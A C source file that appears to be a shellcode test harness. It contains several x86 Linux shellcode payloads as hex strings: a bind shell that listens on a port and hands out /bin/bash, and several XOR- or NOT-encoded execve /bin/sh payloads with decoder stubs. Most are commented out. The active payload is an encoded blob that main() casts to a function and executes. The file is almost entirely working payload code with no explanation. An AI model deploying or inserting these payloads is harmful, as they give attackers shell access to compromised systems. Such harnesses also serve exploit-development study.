#include <stdio.h>
#include <string.h>

//unsigned char shellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb3\x0e\xb0\x66\x31\xc9\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x89\xd0\x83\xc4\x14\x31\xd2\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x83\xec\x08\x6a\x00\x66\x68\x2e\x2a\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x89\xd0\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x83\xc4\x08\x31\xc0\x31\xdb\x31\xc9\x89\xd0\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x51\x51\x52\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xf6\x31\xff\x89\xc6\x89\xd7\x31\xc0\xb0\x66\x31\xdb\xb3\x0d\x89\xd1\xcd\x80\x31\xc0\xb0\x05\x89\xd3\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xf3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x89\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x01\xcd\x80";

//unsigned char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb3\x0e\xb0\x66\x31\xc9\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x89\xd0\x83\xc4\x14\x31\xd2\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x83\xec\x08\x51\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x89\xd0\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x83\xc4\x08\x31\xc0\x31\xdb\x31\xc9\x89\xd0\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x51\x51\x52\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xf6\x31\xff\x89\xc6\x89\xd7\x31\xc0\xb0\x66\x31\xdb\xb3\x0d\x89\xd1\xcd\x80\x31\xc0\xb0\x05\x89\xd3\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xf3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x89\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x01\xcd\x80";

//unsigned char shellcode[]="\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x87\xaa\xe3\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb";

//unsigned char shellcode[]="\xeb\x1d\x5e\xeb\x46\x5f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8a\x1c\x0e\x80\xfb\xbb\x74\x3a\x88\x1c\x17\x80\xc1\x02\x42\xeb\xef\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x87\xaa\xe3\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xe8\xb5\xff\xff\xe8\xb5\xff\xff\xff\xaa\xab\xac\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa";

//unsigned char shellcode[]="\xeb\x1d\x5e\xeb\x46\x5f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8a\x1c\x0e\x80\xfb\xbb\x74\x3a\x88\x1c\x17\x80\xc1\x02\x42\xeb\xef\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x87\xaa\xe3\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xe8\xb5\xff\xff\xe8\xb5\xff\xff\xff\xaa\xab\xac\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa";

//unsigned char shellcode[]="\xeb\x0c\x5e\x31\xc9\xb1\x19\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\xd0\xd0\x8c\x97\x97\xd0\x9d\x96\x91\x78\x1c\x4f\xf4\x32\x7f";

//unsigned char shellcode[]="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";

//unsigned char shellcode[]="\xeb\x18\x5e\x31\xc0\x31\xc9\x31\xdb\x8a\x1e\x80\xf3\xbb\x74\x0f\x8a\x1e\x80\xf3\xaa\x88\x1e\x46\xeb\xef\xe8\xe3\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x2d\x49\x1a\xa1\x67\x2a\xbb";

unsigned char shellcode[] = 
"\xfc\xbb\x1e\xd9\xa2\x4a\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf5\xc1\xfc\x7b\xc9"
"\xc3\xc9\x4d\x12\xa9\xd4\x2d\x57\x15\x9c\x22\x1d\x74\xdd\xce"
"\x8b\x01\xc3\x76\x20\xfe\x14\x95\x49\xfe\x1a\xc1\xdf\xfb\x27"
"\x73\x9a\x25\x65\xbe\x21\x1d\xa9\xfb\x04\xd7\x34\xa5\x31\xcd"
"\xf3\xa5\xbd\x11\x04\xa6";


int main()
{
    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
